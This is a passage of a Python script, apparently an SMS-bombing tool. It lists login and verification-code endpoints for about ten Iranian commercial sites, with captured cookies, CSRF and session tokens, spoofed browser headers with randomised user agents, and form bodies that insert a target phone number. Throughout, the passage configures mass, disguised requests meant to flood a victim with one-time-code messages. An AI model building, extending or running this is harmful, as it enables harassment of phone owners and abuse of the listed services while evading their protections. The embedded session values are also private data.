    'redirect_url': 'https://www.lioncomputer.com',
}

url64 = "https://www.atrafshan.ir/user/login-register"
cookies64 = {
    'PHPSESSID': 'tsfk73mb6kvtds9f7gp06tjcl2',
    '_csrf': 'ca1b22600e9412380e1389b7dd207bd9a40fab615bdc927235cbf8c6cda69e4ca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%229JagElNvbu3pTIfZCX8Vq6hnP3As1Spm%22%3B%7D',
    'shopping-cart': 'f2ed8559e6af9c67b9f8796c76e624443791a86bf6f1eb921c8fc8eb53f642f2a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22shopping-cart%22%3Bi%3A1%3Bs%3A36%3A%22e879871b-239b-4f79-8d6d-6e9b92e9e413%22%3B%7D',
    '_ga': 'GA1.1.8043941.1693688344',
    '_ga_FYT8970WBS': 'GS1.1.1693688343.1.1.1693688357.46.0.0',
}

headers64 = {
    'authority': 'www.atrafshan.ir',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'PHPSESSID=tsfk73mb6kvtds9f7gp06tjcl2; _csrf=ca1b22600e9412380e1389b7dd207bd9a40fab615bdc927235cbf8c6cda69e4ca%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%229JagElNvbu3pTIfZCX8Vq6hnP3As1Spm%22%3B%7D; shopping-cart=f2ed8559e6af9c67b9f8796c76e624443791a86bf6f1eb921c8fc8eb53f642f2a%3A2%3A%7Bi%3A0%3Bs%3A13%3A%22shopping-cart%22%3Bi%3A1%3Bs%3A36%3A%22e879871b-239b-4f79-8d6d-6e9b92e9e413%22%3B%7D; _ga=GA1.1.8043941.1693688344; _ga_FYT8970WBS=GS1.1.1693688343.1.1.1693688357.46.0.0',
    'origin': 'https://www.atrafshan.ir',
    'referer': 'https://www.atrafshan.ir/user/login-register?back=%252F',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

params64 = {
    'back': '%2F',
}

data64 = {
    '_csrf': '1P9Gn-F0wNBo7kcOyZDzxS2l7KrreIuinxbuR9HyBYzttSf4pBiOpgqbdH6d2ZWfbv3U_JpO48zPJa804KF14Q==',
    'LoginRegisterForm[emailOrMobile]': num,
}

url65 = "https://www.lc-man.com/account/sendverificationcode"
cookies65 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '34529f19-a977-5a55-94c5-8110e0273366',
    'analytics_session_token': 'a9919429-53d0-51d9-42f7-d10e81077a67',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_ga_9KG8N0EQDC': 'GS1.1.1693688571.1.0.1693688571.60.0.0',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '__RequestVerificationToken': '2yBdyOjVmK7Q9igGUPUiO07zeYitR1kxJf_nlllhAMZIV7AswW2J-tzVgFCWDygRnp7o1HBDJnFtw8Pql8oTsFU9IWinU9-tVfuEDVYS87s1',
    '_ga': 'GA1.2.61325155.1693688571',
    '_gid': 'GA1.2.1940965173.1693688572',
    '_gat_UA-149384234-1': '1',
}

headers65 = {
    'authority': 'www.lc-man.com',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryV318KgOJRLdABmVg',
    # 'cookie': 'analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=34529f19-a977-5a55-94c5-8110e0273366; analytics_session_token=a9919429-53d0-51d9-42f7-d10e81077a67; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _ga_9KG8N0EQDC=GS1.1.1693688571.1.0.1693688571.60.0.0; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; __RequestVerificationToken=2yBdyOjVmK7Q9igGUPUiO07zeYitR1kxJf_nlllhAMZIV7AswW2J-tzVgFCWDygRnp7o1HBDJnFtw8Pql8oTsFU9IWinU9-tVfuEDVYS87s1; _ga=GA1.2.61325155.1693688571; _gid=GA1.2.1940965173.1693688572; _gat_UA-149384234-1=1',
    'origin': 'https://www.lc-man.com',
    'referer': 'https://www.lc-man.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data65 = f'------WebKitFormBoundaryV318KgOJRLdABmVg\r\nContent-Disposition: form-data; name="__RequestVerificationToken"\r\n\r\njQ_7xH-stsLnRUenBfBLQXlnFXOR2PWIYGrPtFJ12OfjtBryXoICEUKMGL2m1-06tZwlK8fE1sJgc-g335kpbZtM922lMKT7n5R1yA5cxio1\r\n------WebKitFormBoundaryV318KgOJRLdABmVg\r\nContent-Disposition: form-data; name="UserId"\r\n\r\na9912781-bafb-4b3a-9fb6-831a07a533b8\r\n------WebKitFormBoundaryV318KgOJRLdABmVg\r\nContent-Disposition: form-data; name="UserName"\r\n\r\n{num}\r\n------WebKitFormBoundaryV318KgOJRLdABmVg--\r\n'


url66 = "https://flightio.com/bff/Authentication/CheckUserKey"
cookies66 = {
    'f-cli-id': '90876695-0fea-4875-ac3f-88929ee4296e',
    'f-ses-id': 'a81ee9bb-a215-4703-bea3-156f791b0d4c',
    'f-dt_if': 'fa',
    '_gid': 'GA1.2.1033912784.1693726490',
    '_gcl_au': '1.1.467850267.1693726490',
    '_ga_TDE6D3HDPZ': 'GS1.1.1693726490.1.0.1693726490.60.0.0',
    '_ga': 'GA1.1.361878988.1693726490',
    '_hjSessionUser_3605657': 'eyJpZCI6Ijg5YmRjYjcyLTRlMjktNTNlMi1hYjM4LWVkZGZmZDU3YzU3ZSIsImNyZWF0ZWQiOjE2OTM3MjY0OTEwMjUsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_3605657': '0',
    '_hjSession_3605657': 'eyJpZCI6IjUwZGNlMzIyLWY3YzEtNGEwYy05NjFjLTk5OWQ1MThkM2U0MSIsImNyZWF0ZWQiOjE2OTM3MjY0OTEwMjksImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
}

headers66 = {
    'authority': 'flightio.com',
    'accept': 'application/json, text/javascript, text/plain, text/html, application/vnd.ms-excel',
    'accept-language': 'fa_IR',
    'app-type': 'desktop-browser',
    'client-v': '7.6.2',
    'content-type': 'application/json',
    # 'cookie': 'f-cli-id=90876695-0fea-4875-ac3f-88929ee4296e; f-ses-id=a81ee9bb-a215-4703-bea3-156f791b0d4c; f-dt_if=fa; _gid=GA1.2.1033912784.1693726490; _gcl_au=1.1.467850267.1693726490; _ga_TDE6D3HDPZ=GS1.1.1693726490.1.0.1693726490.60.0.0; _ga=GA1.1.361878988.1693726490; _hjSessionUser_3605657=eyJpZCI6Ijg5YmRjYjcyLTRlMjktNTNlMi1hYjM4LWVkZGZmZDU3YzU3ZSIsImNyZWF0ZWQiOjE2OTM3MjY0OTEwMjUsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3605657=0; _hjSession_3605657=eyJpZCI6IjUwZGNlMzIyLWY3YzEtNGEwYy05NjFjLTk5OWQ1MThkM2U0MSIsImNyZWF0ZWQiOjE2OTM3MjY0OTEwMjksImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0',
    'devicetype': 'Windows',
    'f-lang': 'fa',
    'f-ses-id': 'a81ee9bb-a215-4703-bea3-156f791b0d4c',
    'origin': 'https://flightio.com',
    'referer': 'https://flightio.com/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

json_data66 = {
    'userKey': '98-' + num0,
    'userKeyType': 1,
}

url67 = "https://bikoplus.com/Auth/CheckUserPhoneNumber"

cookies67 = {
    'ARRAffinity_Shop': 'af02d4bfa4cb71a2b2febb1f5e9b48bcc5007e31b6f35209910d2c2dfa2af780',
    '_gcl_au': '1.1.305673514.1693727018',
    'ARRAffinity_Blog': 'f4c9a3e4554db36cb46ca02fbd95345a5e37e561d5113f9e752ef5a462cdd29e',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'd05d8e96-c67d-8650-43b5-41ddba8b08ef',
    'analytics_session_token': '69888b67-eeb4-1712-75fb-e15151501141',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_gid': 'GA1.2.1373016068.1693727019',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_clck': '1e1l0iq|2|fep|0|1341',
    '.AspNetCore.Session': 'CfDJ8FdW48GUyjJEvM1d0vNLn8zLpBbK74qV3WDi91rCdCIg89iywn4g4fkPLSQ93b%2BKT1gUdGFK49iJkAql%2BBhZqdA6KwJkDYMTceyuVeWtwQaBHEdyeSdUZj%2BXhrYM85A4tzhxYe1SPU%2FgXO54%2BWvggwtWB%2FwDE8Gvb8WOXMcsqP9H',
    '_gat_UA-165285562-1': '1',
    '_ga': 'GA1.1.343458784.1693727019',
    '_clsk': '1qwklhn|1693727111199|2|1|q.clarity.ms/collect',
    '_ga_QS3BWZHHRE': 'GS1.1.1693727019.1.1.1693727124.0.0.0',
}

headers67 = {
    'authority': 'bikoplus.com',
    'accept': 'application/json, text/plain, */*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/json;charset=UTF-8',
    # 'cookie': 'ARRAffinity_Shop=af02d4bfa4cb71a2b2febb1f5e9b48bcc5007e31b6f35209910d2c2dfa2af780; _gcl_au=1.1.305673514.1693727018; ARRAffinity_Blog=f4c9a3e4554db36cb46ca02fbd95345a5e37e561d5113f9e752ef5a462cdd29e; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=d05d8e96-c67d-8650-43b5-41ddba8b08ef; analytics_session_token=69888b67-eeb4-1712-75fb-e15151501141; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _gid=GA1.2.1373016068.1693727019; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _clck=1e1l0iq|2|fep|0|1341; .AspNetCore.Session=CfDJ8FdW48GUyjJEvM1d0vNLn8zLpBbK74qV3WDi91rCdCIg89iywn4g4fkPLSQ93b%2BKT1gUdGFK49iJkAql%2BBhZqdA6KwJkDYMTceyuVeWtwQaBHEdyeSdUZj%2BXhrYM85A4tzhxYe1SPU%2FgXO54%2BWvggwtWB%2FwDE8Gvb8WOXMcsqP9H; _gat_UA-165285562-1=1; _ga=GA1.1.343458784.1693727019; _clsk=1qwklhn|1693727111199|2|1|q.clarity.ms/collect; _ga_QS3BWZHHRE=GS1.1.1693727019.1.1.1693727124.0.0.0',
    'origin': 'https://bikoplus.com',
    'referer': 'https://bikoplus.com/auth?returnUrl=/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
}

json_data67 = {
    'userPhoneNumber': num,
    'authenticationType': 1,
}

url68 = "https://gooshishop.com/login"
cookies68 = {
    '_gid': 'GA1.2.2094130505.1693727328',
    '_clck': '2u8pr8|2|fep|0|1341',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'a35eca03-ccfa-524c-ff0b-17f19b4ac5e0',
    'analytics_session_token': '623bd74e-9d32-d074-b0c7-93b6fe3e7b91',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '.Nop.Customer': '37b79759-0045-46c4-bb4a-6bb7da36e257',
    '.Nop.Culture': 'c%3Dfa-IR%7Cuic%3Dfa-IR',
    '.Nop.Antiforgery': 'CfDJ8B2cnNPokWVPuiDBzAbkkRypnoRfBX8tAw586W8Jcf6Cp6b9Bpg9TB4jd09EQPIpc9VOhi0PQ08JlrylGLMvQv3ToaRGy2zThIFzKnL5JKvHe8OuQSLPV3Zb1R2W90ixfC0GdIPOtvISiV1Fawc9sMU',
    '_gat_UA-210938482-1': '1',
    '_ga': 'GA1.1.740119389.1693727328',
    '_clsk': 'd555v2|1693727602194|2|1|t.clarity.ms/collect',
    '_ga_J1RPNCGHPP': 'GS1.1.1693727327.1.1.1693727632.0.0.0',
}

headers68 = {
    'authority': 'gooshishop.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gid=GA1.2.2094130505.1693727328; _clck=2u8pr8|2|fep|0|1341; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=a35eca03-ccfa-524c-ff0b-17f19b4ac5e0; analytics_session_token=623bd74e-9d32-d074-b0c7-93b6fe3e7b91; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; .Nop.Customer=37b79759-0045-46c4-bb4a-6bb7da36e257; .Nop.Culture=c%3Dfa-IR%7Cuic%3Dfa-IR; .Nop.Antiforgery=CfDJ8B2cnNPokWVPuiDBzAbkkRypnoRfBX8tAw586W8Jcf6Cp6b9Bpg9TB4jd09EQPIpc9VOhi0PQ08JlrylGLMvQv3ToaRGy2zThIFzKnL5JKvHe8OuQSLPV3Zb1R2W90ixfC0GdIPOtvISiV1Fawc9sMU; _gat_UA-210938482-1=1; _ga=GA1.1.740119389.1693727328; _clsk=d555v2|1693727602194|2|1|t.clarity.ms/collect; _ga_J1RPNCGHPP=GS1.1.1693727327.1.1.1693727632.0.0.0',
    'origin': 'https://gooshishop.com',
    'referer': 'https://gooshishop.com/login?returnUrl=%2F',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

params68 = {
    'returnurl': '/',
}

data68 = {
    'UserName': num,
    '__RequestVerificationToken': 'CfDJ8B2cnNPokWVPuiDBzAbkkRw2viFT3QQ3aCHmhqPopeP_O1YWbZSvEi6Ll19PJ3x4mkMwR27mByFpZKXIcVmkewCsh9NZ4ZMyHdE-TzrBfEnZdxtVkjwqShhLUlSP9FP830WEy585LLExkuidIv0Bdtk',
}


url69 = "https://adak.shop/"
cookies69 = {
    '__arcsjs': '195de9302c0275de783dbfafb480e4f7',
    '_ga': 'GA1.1.511023927.1693727893',
    '_gcl_au': '1.1.1478429421.1693727893',
    'analytics_token': 'a5d5ed19-7cef-8d64-e8b2-d3d7df2a4b94',
    'analytics_session_token': 'f02ffec3-5f3d-7d38-2fc6-90b3996959cb',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_pin_unauth': 'dWlkPU1ESXlNakpqTmpVdE16ZGpPUzAwWlRJNUxUa3hOamN0TXprM1pEazNZVEprWXpJeQ',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga_8G3L0NPQ13': 'GS1.1.1693727893.1.1.1693727908.45.0.0',
}

headers69 = {
    'authority': 'adak.shop',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__arcsjs=195de9302c0275de783dbfafb480e4f7; _ga=GA1.1.511023927.1693727893; _gcl_au=1.1.1478429421.1693727893; analytics_token=a5d5ed19-7cef-8d64-e8b2-d3d7df2a4b94; analytics_session_token=f02ffec3-5f3d-7d38-2fc6-90b3996959cb; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _pin_unauth=dWlkPU1ESXlNakpqTmpVdE16ZGpPUzAwWlRJNUxUa3hOamN0TXprM1pEazNZVEprWXpJeQ; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; _ga_8G3L0NPQ13=GS1.1.1693727893.1.1.1693727908.45.0.0',
    'origin': 'https://adak.shop',
    'referer': 'https://adak.shop/',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

params69 = {
    'wc-ajax': 'yith_welrp_form_action',
}

data69 = {
    'user_login': num,
    'origin': '/',
    'additional': '1',
    'context': 'frontend',
}

url70 = "https://elanza.com/auth"
cookies70 = {
    '_gid': 'GA1.2.1762273727.1693728640',
    '_gat_gtag_UA_174498200_1': '1',
    '_gat_UA-174498200-1': '1',
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': '641db9d1-eb92-08d9-fdb0-463920ef8e69',
    'analytics_session_token': 'b2ffdaba-a85d-0483-b182-3a6b91aa0e85',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    'XSRF-TOKEN': 'eyJpdiI6IitieE9KOHdPUkN5dW1GRWlnSnE5UXc9PSIsInZhbHVlIjoieGJlcWc2Q3RVVjgvMzIvdEVPak9CRHNOa2FvWnRrcUhqMVJCWlJ3dHZyYklmL2NYZ292M3kwR2NoU1JaVk1VV25MZGdhYXhPT0lRTW5IWG50d0tUY3JLMk5lS3pPb1hkNjlIeURVdWRXaEpUQ25sRjY2cGtIRVVoeU12Y3BaWFEiLCJtYWMiOiJmZWM3NmRhNjBlMTY0ZmFjYWEzZDI2YzA2MDg1YzZkOTU3N2NiMWIwNmZkNzUyNjQ1MmVjNjY4OTM1YjAyMTA1IiwidGFnIjoiIn0%3D',
    'elanza_session': 'eyJpdiI6ImQydkc5YzR0aFRhM2M1Qkc1cDlTQ2c9PSIsInZhbHVlIjoibVhFS0NZRmJ6aU5qQ0VTejdNNGsxWTNXWXdLZk51dlpUaHJaVU5jWjdDUXo4dXBxdWh3T1ZDRHpiWmlTa1pQRzU1SThiSXRrZDgxeDNNeFh0TWtqdUQ2RTZCZXI3ZzBXd3lZZDNqcDk1by9LeGlmNHNOcXZzd2FtUlgybEZaYk8iLCJtYWMiOiI1OTMzNjc5YWZjOWQ3OTE4MmIyNWY4ZTg5NTg5YTZkYjRjMTEzNTYxY2E4N2U3YjMwNWI4NzZjNGM3ODAyNTNiIiwidGFnIjoiIn0%3D',
    '_ga': 'GA1.2.188339170.1693728639',
    '_ga_WGPVF8BCQZ': 'GS1.1.1693728639.1.1.1693728652.47.0.0',
}

headers70 = {
    'authority': 'elanza.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gid=GA1.2.1762273727.1693728640; _gat_gtag_UA_174498200_1=1; _gat_UA-174498200-1=1; analytics_campaign={%22source%22:%22google%22%2C%22medium%22:%22organic%22}; analytics_token=641db9d1-eb92-08d9-fdb0-463920ef8e69; analytics_session_token=b2ffdaba-a85d-0483-b182-3a6b91aa0e85; yektanet_session_last_activity=9/3/2023; _yngt_iframe=1; _yngt=7a401b10-0ccdf-f1702-2db11-19b60afa39780; XSRF-TOKEN=eyJpdiI6IitieE9KOHdPUkN5dW1GRWlnSnE5UXc9PSIsInZhbHVlIjoieGJlcWc2Q3RVVjgvMzIvdEVPak9CRHNOa2FvWnRrcUhqMVJCWlJ3dHZyYklmL2NYZ292M3kwR2NoU1JaVk1VV25MZGdhYXhPT0lRTW5IWG50d0tUY3JLMk5lS3pPb1hkNjlIeURVdWRXaEpUQ25sRjY2cGtIRVVoeU12Y3BaWFEiLCJtYWMiOiJmZWM3NmRhNjBlMTY0ZmFjYWEzZDI2YzA2MDg1YzZkOTU3N2NiMWIwNmZkNzUyNjQ1MmVjNjY4OTM1YjAyMTA1IiwidGFnIjoiIn0%3D; elanza_session=eyJpdiI6ImQydkc5YzR0aFRhM2M1Qkc1cDlTQ2c9PSIsInZhbHVlIjoibVhFS0NZRmJ6aU5qQ0VTejdNNGsxWTNXWXdLZk51dlpUaHJaVU5jWjdDUXo4dXBxdWh3T1ZDRHpiWmlTa1pQRzU1SThiSXRrZDgxeDNNeFh0TWtqdUQ2RTZCZXI3ZzBXd3lZZDNqcDk1by9LeGlmNHNOcXZzd2FtUlgybEZaYk8iLCJtYWMiOiI1OTMzNjc5YWZjOWQ3OTE4MmIyNWY4ZTg5NTg5YTZkYjRjMTEzNTYxY2E4N2U3YjMwNWI4NzZjNGM3ODAyNTNiIiwidGFnIjoiIn0%3D; _ga=GA1.2.188339170.1693728639; _ga_WGPVF8BCQZ=GS1.1.1693728639.1.1.1693728652.47.0.0',
    'origin': 'https://elanza.com',
    'referer': 'https://elanza.com/auth',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data70 = {
    '_token': 'ZLi7E0uOOo3XhlZy1ePlHgs0HhLfaCp6SxVaGTze',
    'username': num,
}

url71 = "https://rogeh.com/wp-admin/admin-ajax.php"
cookies71 = {
    '__arcsco': '20e9c5aca7443cfc975fd9e54f1af614',
    'digits_countrycode': '98',
    '_ga': 'GA1.2.1794656412.1693729082',
    '_gid': 'GA1.2.805790804.1693729083',
    '_gat_gtag_UA_79426492_1': '1',
    '_ga_B3WR9PXH0F': 'GS1.1.1693729082.1.0.1693729085.0.0.0',
}

headers71 = {
    'authority': 'rogeh.com',
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': '__arcsco=20e9c5aca7443cfc975fd9e54f1af614; digits_countrycode=98; _ga=GA1.2.1794656412.1693729082; _gid=GA1.2.805790804.1693729083; _gat_gtag_UA_79426492_1=1; _ga_B3WR9PXH0F=GS1.1.1693729082.1.0.1693729085.0.0.0',
    'origin': 'https://rogeh.com',
    'referer': 'https://rogeh.com/my-account/?login=true&back=home&page=1',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': fake.random,
    'x-requested-with': 'XMLHttpRequest',
}

data71 = {
    'action': 'digits_check_mob',
    'countrycode': '+98',
    'mobileNo': num0,
    'csrf': '7481499d2a',
    'login': '1',
    'username': '',
    'email': '',
    'captcha': '',
    'captcha_ses': '',
    'digits': '1',
    'json': '1',
    'whatsapp': '0',
    'mobmail': num,
    'dig_otp': '',
    'digits_login_remember_me': '1',
    'dig_nounce': '7481499d2a',
}

url72 = "https://accounts.theforge.ir/Account/SignIn"
cookies72 = {
    '.AspNetCore.Antiforgery.BaArTo3YD3c': 'CfDJ8DZYXvPcUB1EjhWR5h6wMNPuvrbBgJQhrvNPddrHlX_Rau1639XQT21xhEC1CfXKnvqOun2eDywoMsxw4JMaDGKD3lyEVBqvqm0WAHUdPVeOeAGsURE3avYpq6eUccBz_lJ-8nm-wag4G0dS3CxTv_k',
}

headers72 = {
    'authority': 'accounts.theforge.ir',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '.AspNetCore.Antiforgery.BaArTo3YD3c=CfDJ8DZYXvPcUB1EjhWR5h6wMNPuvrbBgJQhrvNPddrHlX_Rau1639XQT21xhEC1CfXKnvqOun2eDywoMsxw4JMaDGKD3lyEVBqvqm0WAHUdPVeOeAGsURE3avYpq6eUccBz_lJ-8nm-wag4G0dS3CxTv_k',
    'origin': 'null',
    'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': fake.random,
}

data72 = {
    'ReturnUrl': '/connect/authorize/callback?client_id=zoomit-prod&scope=openid%20profile%20offline_access&response_type=code&redirect_uri=https%3A%2F%2Fzoomit.ir%2Fapi%2Fauth%2Fcallback%2Fidentity-server4&state=lYhPUtaacZhAi4z4lgSzL_LzsLLUygm16t3U4-hOFhA&code_challenge=-Nr5l3lH8t4ujTHYf9h5XQR3qPQV9X6ujjbsKskE1yM&code_challenge_method=S256',
    'Username': num,
    '__RequestVerificationToken': 'CfDJ8DZYXvPcUB1EjhWR5h6wMNMMbHqUPtrMppQjkfCmyFJyF52DlYyA0uY6NuKTkOBb_v4qfnvmUVHYHw4bt1LEFlbj_eF59oFtMGiyck1WzHuQyycBRI7urs18L_TE9HCblcOUuDQMOB5fJjCbFUOYwms',
}

url73 = "https://www.entekhabcenter.com/auth"
cookies73 = {
    'analytics_campaign': '{%22source%22:%22google%22%2C%22medium%22:%22organic%22}',
    'analytics_token': 'abecc6d4-b94a-0738-40ff-37bf450314cb',
    'analytics_session_token': '54b5311a-adc9-f9cb-fd5a-ea84ed57b91e',
    'yektanet_session_last_activity': '9/3/2023',
    '_yngt_iframe': '1',
    '_yngt': '7a401b10-0ccdf-f1702-2db11-19b60afa39780',
    '_ga': 'GA1.2.1453660068.1693729659',
    '_gid': 'GA1.2.1339218606.1693729659',
    '_gat_gtag_UA_136391750_1': '1',
    '_ga_KM5G9YGP4G': 'GS1.1.1693729659.1.0.1693729663.56.0.0',
    'XSRF-TOKEN': 'eyJpdiI6IldGYjB1WGx2aHdOTEJ6WTUzR3BqZEE9PSIsInZhbHVlIjoiSDNid1ZQV2lhL1NZU1dqaVpaVGx4MWVaS2s1cG5jQTBtUmFhYk5ndUZUeWpTZUVqMkpiZExCaFNId2U1UTJjUU9xWEhIYlhoZFRQWU1MK1FXNkZYVUpoL3R5TXd6U3p2dGNXTmpia0Urb29RajJ5YnZpQ1IyVmdTYzRoQmtybDAiLCJtYWMiOiI1NjBhYzRkOTQ4Y2IyMDNmZmMzOWFiMjY1OTNiOTAxZTQxYjhhYWJkNjk5Mjg1NTc5MGEzZmZhOWMxOGQ0MzZjIiwidGFnIjoiIn0%3D',
    'se_entekhabcenterapptwo_cxv': 'eyJpdiI6IjMvS1BXaHMzRlpCVWlPNDEySGZGQ1E9PSIsInZhbHVlIjoia0p3bnkwQXMrOENBaFYwbi9sWTZGdWpzUFRkM2ppNEJCaUNDeWZBUHdqTEJmenVYN050cjJJYTl5YjlnYmxqK1J1TkIzemtMZ3paYmE4ZktXZlJxTWNySmVnd1ExZGNqc3FuQm50My9LbnVHblVEd1hnaDV4dDh2UDZsckFDWTQiLCJtYWMiOiJiYzI1MzM0MTM3NzM1ZTQ5NzBmNGVlMTA3ZGNmOTFkNjdmY2RkMDVjYzQ2MjU0ODEyNDIwNTc0ZDI0OGFmZjYzIiwidGFnIjoiIn0%3D',
}

headers73 = {
    'authority': 'www.entekhabcenter.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9,fa;q=0.8',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
